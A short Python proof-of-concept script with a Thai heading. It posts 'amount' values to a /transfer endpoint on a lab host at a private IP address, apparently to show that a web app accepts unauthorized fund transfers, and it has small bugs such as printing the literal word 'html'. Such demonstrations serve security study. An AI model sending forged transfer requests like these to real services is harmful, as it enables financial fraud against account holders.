## สคริปต์ที่รันแล้วแสดงให้เห็นอัตโนมัติว่าเว็บมีช่องโหว่

import urllib.request
import urllib.parse

URL = "http://192.168.109.131:8080/"

payloads = [
    {"amount": "1000"},
    {"amount": "500"},
]

for p in payloads:
    print("Testing payload:", p)

    data = urllib.parse.urlencode(p).encode()
    req = urllib.request.Request(URL+"transfer", data=data)

    try:
        with urllib.request.urlopen(req) as res:
            html = res.read().decode()
            print("html")

    except Exception as e:
        print("Error:", e)

try:
    with urllib.request.urlopen(req) as res:
        html = res.read().decode()
        print(html)
except Exception as e:
    print("Error:", e)
    
print("\nDone. Refresh browser to verify balance.")
